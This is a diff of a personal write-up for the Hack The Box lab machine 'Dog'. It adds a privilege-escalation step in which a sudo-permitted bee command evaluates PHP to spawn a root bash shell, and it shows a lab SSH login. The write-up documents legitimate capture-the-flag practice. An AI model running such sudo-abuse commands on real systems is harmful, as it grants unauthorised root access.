@@ -1,7 +1,6 @@
 https://app.hackthebox.com/machines/Dog
 
-![](../../Attachments/Pasted%20image%2020250629185646.png)
-
+![](../../Attachments/Pasted%20image%2020250630170912.png)
 
 # Scope 
 Target IP: 10.10.11.58
@@ -156,6 +155,18 @@ I successfully logged into SSH with user `johncusack` and password: `BackDropJ20
 ![](../../Attachments/Pasted%20image%2020250630164349.png)
 
 With this ssh connection I get the user flag.
+
+With `sudo -l` I tried to look how privileged is the user:
+
+![](../../Attachments/Pasted%20image%2020250630165231.png)
+
+A `bee` command was found. I typed the following code to escalate privileges:
+
+```bash
+sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
+```
+
+![](../../Attachments/Pasted%20image%2020250630170802.png)
 
 
 ---
